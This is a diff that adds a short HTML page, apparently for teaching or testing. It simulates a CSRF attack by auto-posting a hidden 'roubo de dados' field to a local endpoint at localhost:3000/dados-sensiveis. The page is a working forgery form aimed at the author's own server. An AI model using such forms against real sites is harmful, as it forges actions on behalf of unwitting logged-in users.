@@ -1,0 +1,18 @@
+<!-- ataque.html -->
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title>CSRF Test</title>
+</head>
+
+<body>
+    <h1>Simulando ataque CSRF</h1>
+
+    <form action="http://localhost:3000/dados-sensiveis" method="POST">
+        <input type="hidden" name="dado" value="roubo de dados">
+        <button type="submit">Enviar ataque CSRF</button>
+    </form>
+</body>
+
+</html>
